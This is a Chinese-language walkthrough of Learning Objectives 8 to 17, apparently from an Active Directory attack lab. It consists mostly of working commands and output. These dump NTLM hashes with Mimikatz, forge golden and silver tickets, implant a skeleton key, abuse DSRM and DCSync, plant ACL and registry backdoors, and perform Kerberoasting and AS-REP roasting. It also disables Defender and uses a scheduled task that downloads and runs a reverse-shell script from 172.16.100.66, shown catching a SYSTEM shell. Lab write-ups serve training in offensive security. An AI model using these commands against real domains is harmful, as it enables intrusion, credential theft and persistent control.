账号srvadmin可以横向登录到计算机dcorp-mgmt.dollarcorp.moneycorp.local，我们把登录的session保存在$sess
```
$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
```

在指定session里载入Mimikatz
```
Invoke-Command -FilePath C:\AD\Invoke-Mimikatz.ps1 -Session $sess
```

指定目标靶机的session，在目标靶机关闭杀软（效果跟bypass AMSI大同小异，不过因为我们是目标靶机上的管理员，因此可以直接关闭）
```
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
```

指定目标靶机的session，在目标靶机执行Mimikatz
```
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
```

如果上面不能正常执行，直接enter psssession进去关掉实时防护，然后再执行Invoke-Mimikatz

收集到在NTML信息有：
```
DCORP-MGMT$ : 639c1adde3e0d1ba0d733c7d0d8f23ec
mgmtadmin : 95e2cd7ff77379e34c6e46265e75d754
svcadmin : b38ff50264b74508085d82c69794a4d8
```

由于svcadmin要DA管理员，因此我们已经提升到了DA权限


# Learning Objective 8:
Task
● Dump hashes on the domain controller of dollarcorp.moneycorp.local.
● Using the NTLM hash of krbtgt account, create a Golden ticket.
● Use the Golden ticket to (once again) get domain admin privileges from a machine.

## Dump hashes on the domain controller of dollarcorp.moneycorp.local.
开一个svcadmin的shell

```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
```

bypass everything

引入mimikatz,dump all hash

```
[dcorp-dc]: PS C:\Users\svcadmin\Documents> Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # lsadump::lsa /patch
Domain : dcorp / S-1-5-21-1874506631-3219952063-538504511

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : af0686cc0ca8f04df42210c9ac980760

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : ff46a9d8bd66c6efd77603da26796f35

RID  : 000001f7 (503)
User : DefaultAccount
LM   :
NTLM :

RID  : 00000455 (1109)
User : ciadmin
LM   :
NTLM : e08253add90dccf1a208523d02998c3d

RID  : 00000458 (1112)
User : sqladmin
LM   :
NTLM : 07e8be316e3da9a042a9cb681df19bf5

RID  : 00000459 (1113)
User : websvc
LM   :
NTLM : cc098f204c5887eaa8253e7c2749156f

RID  : 0000045b (1115)
User : srvadmin
LM   :
NTLM : a98e18228819e8eec3dfa33cb68b0728

RID  : 0000045d (1117)
User : appadmin
LM   :
NTLM : d549831a955fee51a43c83efb3928fa7

RID  : 00000461 (1121)
User : mgmtadmin
LM   :
NTLM : 95e2cd7ff77379e34c6e46265e75d754

RID  : 00000462 (1122)
User : svcadmin
LM   :
NTLM : b38ff50264b74508085d82c69794a4d8

RID  : 0000046b (1131)
User : studentadmin
LM   :
NTLM : d1254f303421d3cdbdc4c73a5bce0201

RID  : 00000470 (1136)
User : sql1admin
LM   :
NTLM : e999ae4bd06932620a1e78d2112138c6

<skip>
```



## Using the NTLM hash of krbtgt account, create a Golden ticket.
krbtgt hash:
```
krbtgt : ff46a9d8bd66c6efd77603da26796f35
```

制作一张Golden ticket（可以另外起一个student权限在shell）

```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```


验证金票：
```
ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
```

## Use the Golden ticket to (once again) get domain admin privileges from a machine.

因为金票下可以横向到任何一台计算机，所以可以去DC下再次dump出所有哈希,这里不再演示
```
PS C:\ad> . .\PowerView.ps1
PS C:\ad> Find-LocalAdminAccess
dcorp-stdadm.dollarcorp.moneycorp.local
dcorp-std364.dollarcorp.moneycorp.local
dcorp-appsrv.dollarcorp.moneycorp.local
dcorp-std368.dollarcorp.moneycorp.local
dcorp-std359.dollarcorp.moneycorp.local
dcorp-std366.dollarcorp.moneycorp.local
dcorp-std369.dollarcorp.moneycorp.local
dcorp-std363.dollarcorp.moneycorp.local
dcorp-sql1.dollarcorp.moneycorp.local
dcorp-std370.dollarcorp.moneycorp.local
dcorp-dc.dollarcorp.moneycorp.local
dcorp-std367.dollarcorp.moneycorp.local
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-mssql.dollarcorp.moneycorp.local
dcorp-mgmt.dollarcorp.moneycorp.local
dcorp-ci.dollarcorp.moneycorp.local
```

# Learning Objective 9:
Task
● Try to get command execution on the domain controller by creating silver ticket for:
− HOST service
− WMI


DCORP-DC$的哈希信息
```
RID  : 000003e8 (1000)
User : DCORP-DC$
LM   :
NTLM : 126289c16302fb23b71ec09f0d3d5391
```
## HOST service

普通权限shell下执行命令
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /ptt"'
```


验证银票：
```
ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
```


执行完上面命令，在当前shell会有一个Administrator的session

新建一个定时任务，反弹dc上的一个shell回来。需要注意Invoke-PowerShellTcp.ps1里最后一行要加上
```
Power -Reverse -IPAddress 172.16.100.66 -Port 443
```
表示调用自己


使用定时任务执行命令

## 制作定时任务：
```
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User366" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1''')'"
```

## 触发定时任务
```
schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "User366"
```

收到反弹shell
```
PS C:\ad> .\nc.exe -lnvp 443
listening on [any] 443 ...
connect to [172.16.100.66] from (UNKNOWN) [172.16.2.1] 51201

Windows PowerShell running as user DCORP-DC$ on DCORP-DC
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> PS C:\Windows\system32> PS C:\Windows\system32>
PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> hostname
dcorp-dc
```
## WMI


RPCSS
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /ptt"'
```

然后执行WMI 
```
PS C:\ad> Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local


SystemDirectory : C:\Windows\system32
Organization    :
BuildNumber     : 14393
RegisteredUser  : Windows User
SerialNumber    : 00377-80000-00000-AA805
Version         : 10.0.14393
```


# Learning Objective 10:
Task
● Use Domain Admin privileges obtained earlier to execute the Skeleton Key attack.

开一个DA shell

```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:af0686cc0ca8f04df42210c9ac980760 /run:powershell.exe"'
```


### 方法1
```
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```
### 方法2(推荐)
回到学生机器,创建一个DC的登录session
```
$sess = New-PSSession dcorp-dc.dollarcorp.moneycorp.local
```

把mimikatz加载到指定session
```
Invoke-Command -FilePath C:\AD\Invoke-Mimikatz.ps1 -Session $sess
```

再次进入DC
```
 Enter-PSSession -Session $sess
```

执行mimikatz，制作万能钥匙
```
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
```

开一个学生shell使用下面命令以student368的身份进入主机
```Enter-PSSession –Computername dcorp-std370.dollarcorp.moneycorp.local –credential dcorp\student370```



# Learning Objective 11:
Task
● Use Domain Admin privileges obtained earlier to abuse the DSRM credential for persistence.

目录服务还原模式。除了krbtgt服务帐号外，域控上还有个可利用的账户：目录服务还原模式（DSRM）账户，这个密码是在DC安装的时候设置的，所以一般不会被修改

用有DA权限的shell，运行下面命令，dump出DSRM的哈希密码

```
PS C:\ad> Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dcorp-dc

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

544     {0;000003e7} 1 D 17963          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;009e5f7f} 0 D 10379178    dcorp\Administrator     S-1-5-21-1874506631-3219952063-538504511-500    (13g,26p)       Primary
 * Thread Token  : {0;000003e7} 1 D 10421329    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz(powershell) # lsadump::sam
Domain : DCORP-DC
SysKey : 85462b93fc25ee67bb07ad899096199b
Local SID : S-1-5-21-1752050383-1088309824-3131404450

SAMKey : 33e0913ef3886d77d5873060bcea1cfb

RID  : 000001f4 (500)
User : Administrator
Hash NTLM: a102ad5753f4c441e3af31c97fad86fd

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount
```

这里会出现Administrator的哈希(也就是DSRM的密码)：```a102ad5753f4c441e3af31c97fad86fd```

再用下面命令dump出现在Administrator的密码，与上面DSRM的密码进行比较

```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : af0686cc0ca8f04df42210c9ac980760
```
新的密码是：```af0686cc0ca8f04df42210c9ac980760```

DSRM administrator不允许登陆，用之前的session进入DC修改

要先bypass ASMI

再运行下面命令，修改DSRM的远程登录策略
```
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```


现在用DSRM的原始哈希，来运行一个有DA权限的shell,注意，这里的/domain参数指定的是dcorp-dc这台计算机，不是域的名字
```
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
```

验证:
```
PS C:\ad> ls \\dcorp-dc.dollarcorp.moneycorp.local\c$


    Directory: \\dcorp-dc.dollarcorp.moneycorp.local\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/29/2019   1:32 AM                PerfLogs
d-r---        2/16/2019   9:14 PM                Program Files
d-----        7/16/2016   6:23 AM                Program Files (x86)
d-r---       12/14/2019   8:23 PM                Users
d-----        8/20/2020   2:05 AM                Windows
```

可以访问文件系统，但是不能在这台系统上执行命令。

如果想要用DSRM获得一个shell，可以设置一个定时任务

# Learning Objective 12:
Task
● Check if studentx has Replication (DCSync) rights.
● If yes, execute the DCSync attack to pull hashes of the krbtgt user.
● If no, add the replication rights for the studentx and execute the DCSync attack to pull hashes of the krbtgt user.

## Check if studentx has Replication (DCSync) rights.
查找账号student366是否有DCSync的权限（此操作需要DA权限）
```
PS C:\ad> . .\PowerView.ps1
PS C:\ad> Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "student366") -and (($_.ObjectType -match'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```
如果没有任何返回，表示没有权限

## If yes, execute the DCSync attack to pull hashes of the krbtgt user.

问题前提不成立

## If no, add the replication rights for the studentx and execute the DCSync attack to pull hashes of the krbtgt user.

来到有DA权限的shell，注意这里要enter-pssession到DC服务器

添加完全控制权限
```
Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student366 -Rights All -Verbose
```
再把Dcsync权限赋予当前学生账号student366
```
Add-ObjectAcl -TargetDistinguishedName"dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName student366 -Rights DCSync -Verbose
```

再次查看本账号是否有Dcsync权限

```
[dcorp-dc]: PS C:\Users\Administrator\Documents> Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local"
-ResolveGUIDs | ?{($_.IdentityReference -match "student366") -and (($_.ObjectType -match'replication') -or ($_.ActiveDir
ectoryRights -match 'GenericAll'))}


InheritedObjectType   : All
ObjectDN              : DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : dcorp\student366
IsInherited           : False
ActiveDirectoryRights : GenericAll
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-1874506631-3219952063-538504511

```

已经出现```ActiveDirectoryRights : GenericAll```表示成功赋权


执行Dcsync,导出krbtgt哈希（也可以是其他用户,此操作需要在DA权限的shell里操作）
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```


# Learning Objective 13:
Task
● Modify security descriptors on dcorp-dc to get access using PowerShell remoting and WMI without requiring administrator access.
● Retrieve machine account hash from dcorp-dc without using administrator access and use that to execute a Silver Ticket attack to get code execution with WMI.


## Modify security descriptors on dcorp-dc to get access using PowerShell remoting and WMI without requiring administrator access.


在DA权限shell引入RACE.ps1框架
```
PS C:\ad> . .\RACE.ps1
```

为WMI修改安全描述符，允许student366进入WMI
```
Set-RemoteWMI -SamAccountName student366 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' -Verbose
```

在学生shell（重启VM生效）查看
```
gwmi -class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```


## Retrieve machine account hash from dcorp-dc without using administrator access and use that to execute a Silver Ticket attack to get code execution with WMI.

DA shell，引入RACE.ps1，域名写全(注意：这里如果不能正常设置，enter-psssesion到DC，bypass AMSI，远程加载RACE.ps1后在DC上设置)
```
PS C:\ad> . .\RACE.ps1
PS C:\ad> Set-RemotePSRemoting -SamAccountName student366 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
```

在学生shell，执行whoami命令
```
PS C:\ad> Invoke-Command -ScriptBlock{whoami} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
dcorp\student366
```

## 无管理员密码的情况下从目标机器上dump出哈希

Modifying DC registry security descriptors for remote hash retrieval using DAMP

在DC上修改权限，允许本账号（student366）远程dump出哈希，在DAshell
```
Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student366 -Verbose
```

在学生shell
引入框架
```
PS C:\ad> . .\RACE.ps1
```

dump出dcorp-dc这台机器的哈希
```
PS C:\ad> Get-RemoteMachineAccountHash -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
VERBOSE: Bootkey/SysKey : 85462B93FC25EE67BB07AD899096199B
VERBOSE: LSA Key        : FD3251451B1293B9ED7AF4BED8E19A678F514B9BC2B42B796E2C72AF156945E9

ComputerName                        MachineAccountHash
------------                        ------------------
dcorp-dc.dollarcorp.moneycorp.local 126289c16302fb23b71ec09f0d3d5391
```

现在我们有了这台机器的哈希，可以用来制作银票

基于HOST服务的银票
```
. .\Invoke-Mimikatz.ps1
PS C:\ad> Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /ptt"'
```

基于RPCSS服务的银票
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /ptt"'
```

可以建一个定时任务反弹DC这台服务器的shell

# Learning Objective 14:
Task
● Using the Kerberoast attack, crack password of a SQL server service account.

查找所有SPN，会有很多返回，但主要查看域管理员开启的服务
```
PS C:\ad> Get-NetUser -spn |select userprincipalname,serviceprincipalname

userprincipalname serviceprincipalname
----------------- --------------------
                  kadmin/changepw
websvc            {SNMP/ufc-adminsrv.dollarcorp.moneycorp.LOCAL, SNMP/ufc-adminsrv}
svcadmin          {MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433, MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local}
```

尤其留意域管理员的信息，这里svcadmin开启了SQL server服务。

因为svcadmin是一个域管理员，所以我们可以以它开启的服务请求一个tikcet

下面两条命令在学生shell下执行，如果报错了，可能是student VM的网络问题，重启一下
```
PS C:\ad> Add-Type -AssemblyName System.IdentityModel
PS C:\ad> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"


Id                   : uuid-396ea046-4707-42b5-aeca-14c64449d666-1
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/21/2022 7:06:53 AM
ValidTo              : 2/21/2022 5:03:41 PM
ServicePrincipalName : MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

```

用klist命令

```
PS C:\ad> klist

Current LogonId is 0:0x3114e90c

Cached Tickets: (11)

<略>
#1>     Client: student366 @ DOLLARCORP.MONEYCORP.LOCAL
        Server: MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 2/20/2022 23:06:53 (local)
        End Time:   2/21/2022 9:03:41 (local)
        Renew Time: 2/27/2022 23:03:41 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: dcorp-dc.dollarcorp.moneycorp.local
<略>
```

有MSSQLSvc的TGS。client就是学生账号student366

用Mimikatz dump出tikets

```
 Invoke-Mimikatz -Command '"kerberos::list /export"'

 <略>
[00000001] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 2/20/2022 11:06:53 PM ; 2/21/2022 9:03:41 AM ; 2/27/2022 11:03:41 PM
   Server Name       : MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
   Client Name       : student366 @ DOLLARCORP.MONEYCORP.LOCAL
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
   * Saved to file     : 1-40a10000-student366@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
<略>
```

在当前目录生成了一个TGS文件```1-40a10000-student366@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi```

拷贝到文件夹```kerberoast```，使用```tgsrepcrack.py```破解密码
执行命令：
```
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt 1-40a10000-student366@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
```

爆破结果
```
PS C:\ad\kerberoast> python.exe .\tgsrepcrack.py .\10k-worst-pass.txt 1-40a10000-student366@MSSQLSvc~dcorp-mgmt.dollarco
rp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
found password for ticket 0: *ThisisBlasphemyThisisMadness!!  File: 1-40a10000-student366@MSSQLSvc~dcorp-mgmt.dollarcorp
.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
All tickets cracked!
```

得到了svcadmin的明文密码
```
*ThisisBlasphemyThisisMadness!!
```

用上面的明文密码登陆dcorp-dc，输入明文密码后可以成功登录
```
PS C:\ad> Enter-PSSession –Computername dcorp-dc –credential dcorp\svcadmin
[dcorp-dc]: PS C:\Users\svcadmin\Documents> whoami
dcorp\svcadmin
[dcorp-dc]: PS C:\Users\svcadmin\Documents> hostname
dcorp-dc
[dcorp-dc]: PS C:\Users\svcadmin\Documents>
```

# Learning Objective 15:
Task
● Enumerate users that have Kerberos Preauth disabled.
● Obtain the encrypted part of AS-REP for such an account.
● Determine if studentx has permission to set User Account Control flags for any user.
● If yes, disable Kerberos Preauth on such a user and obtain encrypted part of AS-REP.


## Enumerate users that have Kerberos Preauth disabled.

枚举禁用了Kerberos预认证的用户
```
PS C:\ad> . .\PowerView_dev.ps1
PS C:\ad> Get-DomainUser -PreauthNotRequired -Verbose
```

枚举到一个VPN359user用户禁用了Kerberos预认证


## Obtain the encrypted part of AS-REP for such an account.
使用ASREPRoast.ps1获取kerb哈希值，这个值可以使用john等破解工具破解

```
PS C:\ad> cd .\ASREPRoast-master\
PS C:\ad\ASREPRoast-master> . .\ASREPRoast.ps1
PS C:\ad\ASREPRoast-master> Get-ASREPHash -UserName VPN359user -Verbose
$krb5asrep$VPN359user@dollarcorp.moneycorp.local:30e35adffeca96ff7fda13d6340edc2b$e155224938f72c7877c24e3012d35312f4e4ce
179cb9e33a8eedd4a516500b7acc1d16c96c49b3af2aac0334b48931e995dabd1bcac434475b4983f9455fa4657b296427d48fe6608a8ed18a067432
3da2900378b1340a322c8fe1ef88eab3a3f1c8bb8e69b2f943b93261c5d75732e3321bfc1d247a718775a58a84a3ce0b52c25a3ea073e2a96606a311
565efd705e66af36f18396fbbf08432e6b68dcc11b80d883ff933dee04ca0ccbbd57ce6be24ee38ff5f677a156d037e605ea8ac6edf316711eda9036
b390d4c0f7083086ee7cade6aa572a4f9323fae40451a962e8682839167997181a7183e9fe50a5e3cd478c59040351376160f69ecf3c6fd1f76c5637
679a7344fe
```


## Determine if studentx has permission to set User Account Control flags for any user.
枚举RDPUsers组成员对其中有GenericWrite 或者 GenericAll权限的用户

```
PS C:\ad> . .\PowerView_dev.ps1
PS C:\ad> Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

ObjectDN                : CN=Control359User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-1874506631-3219952063-538504511-1116
IdentityReferenceName   : RDPUsers
IdentityReferenceDomain : dollarcorp.moneycorp.local
IdentityReferenceDN     : CN=RDP Users,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
IdentityReferenceClass  : group
```


## If yes, disable Kerberos Preauth on such a user and obtain encrypted part of AS-REP.

因为当前账号（student366）在RDPUsers组中，而RDPUsers组对上面这些用户有GenericAll或者GenericWrite的权限，所以可以强制关闭这些用户的预认证
```
Set-DomainObject -Identity Control359User -XOR @{useraccountcontrol=4194304} -Verbose
```

关闭以后获取这个用户的krb5哈希

```
Get-ASREPHash -UserName Control359User -Verbose
```

获取的这个值可以用JTR破解


# Learning Objective 16:
Task
● Determine if studentx has permissions to set UserAccountControl flags for any user.
● If yes, force set a SPN on the user and obtain a TGS for the user.

## Determine if studentx has permissions to set UserAccountControl flags for any user.

从下面结果可以知道当前账号（student366，是RDPUsers组的成员），对下面显示的账号是有GenericAll权限的
```
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"} |select ObjectDN,ActiveDirectoryRights

bjectDN                                                       ActiveDirectoryRights
--------                                                       ---------------------
CN=Control370User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
```

## If yes, force set a SPN on the user and obtain a TGS for the user.

选择Support370User用户，查询这个账号是否有SPN

```
PS C:\ad> Get-DomainUser -Identity Support370User | select serviceprincipalname


serviceprincipalname
--------------------
```

没有。



因为本账号（student366，是RDPUsers组的成员），对这个用户有GenericAll权限，我们可以为其设置一个SPN
```
Set-DomainObject -Identity Support370User -Set @{serviceprincipalname='dcorp/whateverX'} -Verbos
```

再次获取这个账号的SPN
```
PS C:\ad> Get-DomainUser -Identity Support370User | select serviceprincipalname
serviceprincipalname
--------------------
dcorp/whateverX
```

根据这个SPN，我们可以请求一个可以被破解的ticket
```
Add-Type -AssemblyNAme System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "dcorp/whateverX"
```

使用klist命令列出SPN
```
PS C:\ad> klist

Current LogonId is 0:0x2a582
#1>     Client: student366 @ DOLLARCORP.MONEYCORP.LOCAL
        Server: dcorp/whateverX @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 2/15/2022 2:36:31 (local)
        End Time:   2/15/2022 12:36:31 (local)
        Renew Time: 2/22/2022 2:36:31 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: dcorp-dc.dollarcorp.moneycorp.local
```

看到已经有dcorp/whateverX的SPN

用mimikatz导出

```
PS C:\ad> . .\Invoke-Mimikatz.ps1
PS C:\ad> Invoke-Mimikatz -Command '"kerberos::list /export"'
[00000001] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 2/15/2022 2:36:31 AM ; 2/15/2022 12:36:31 PM ; 2/22/2022 2:36:31 AM
   Server Name       : dcorp/whateverX @ DOLLARCORP.MONEYCORP.LOCAL
   Client Name       : student366 @ DOLLARCORP.MONEYCORP.LOCAL
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
   * Saved to file     : 1-40a10000-student366@dcorp~whateverX-DOLLARCORP.MONEYCORP.LOCAL.kirbi
```

导出来的tiket可以用tgsrepcrack.py破解

也可以用powerview导出krb5哈希，然后再用john破解
```
Get-DomainUser -Identity Support370User | Get-DomainSPNTicket | select -ExpandProperty Hash
```


# Learning Objective 17:
Task
•  Find a server in the dcorp domain where Unconstrained Delegation is enabled.
•  Access that server, wait for a Domain Admin to connect to that server and get Domain Admin privileges.

非约束委派

枚举非约束委派计算机（Unconstrained Delegation），使用powerview的dev版本
```
PS C:\ad> Get-NetComputer -UnConstrained |select cn
cn
--
DCORP-DC
DCORP-APPSRV
```

枚举到两台计算机启用了无约束委派：dcorp-dc（DC服务器）和dcorp-appsrv

什么是无约束委派？

> 用户 A 去访问服务 B，服务 B 的服务账户开启了非约束委派，那么当用户 A 访问服务 B 的时候会将用户 A 的 TGT 发送给服务 B 并保存进内存，服务 B 能够利用用户 A 的身份去访问用户 A 能够访问到的任意服务。

在下面这个例子里用户 A是DA管理员Administrator，服务 B是机器dcorp-appsrv。由于Administrator访问过dcorp-appsrv，所以把自己的TGT发送给了dcorp-appsrv，那么dcorp-appsrv就能够利用DA管理员的身份去访问域内的任何服务。

由于使用无约束委派的先决条件是有一个有本地管理权限的用户，
我们需要攻陷DCORP-APPSRV这台机器上一个有本地管理员权限的用户
之前我们分别收集了appadmin, srvadmin 和 websvc的用户名机器NTML
现在分别用这三个账号测试，是否在dcorp-appsrv这台机器上有本地管理员权限
```
appadmin:d549831a955fee51a43c83efb3928fa7
srvadmin:a98e18228819e8eec3dfa33cb68b0728
websvc：cc098f204c5887eaa8253e7c2749156f
```

分别对三个用户执行下面权限，得到一个该用户的新shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:appadmin /domain:dollarcorp.moneycorp.local /ntlm:d549831a955fee51a43c83efb3928fa7 /run:powershell.exe"'
```

appadmin拥有local admin权限的机器有
```
PS C:\ad> . .\PowerView.ps1
PS C:\ad> Find-LocalAdminAccess
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-std366.dollarcorp.moneycorp.local
dcorp-appsrv.dollarcorp.moneycorp.local
```

websvc拥有local admin权限的机器有
```
 PS C:\ad> . .\PowerView.ps1
PS C:\ad> Find-LocalAdminAccess
dcorp-std366.dollarcorp.moneycorp.local
```

srvadmin拥有local admin权限的机器有
```
PS C:\ad> . .\PowerView.ps1
PS C:\ad> Find-LocalAdminAccess
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-mgmt.dollarcorp.moneycorp.local
dcorp-std366.dollarcorp.moneycorp.local
```

由枚举结果可知，符合条件的只有appadmin

### 方法一（DA令牌复用）

起一个dcorp-appsrv的session
```
$sess = New-PSSession -ComputerName dcorp-appsrv.dollarcorp.moneycorp.local
```

在指定session里载入Mimikatz（这里如果不能载入，可以多试几次直接```Enter-PSSession $sess```,进去以后直接bypass掉AMSI）
```
Invoke-Command -FilePath C:\AD\Invoke-Mimikatz.ps1 -Session $sess
```

指定目标靶机的session，在目标靶机关闭杀软
```
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
```

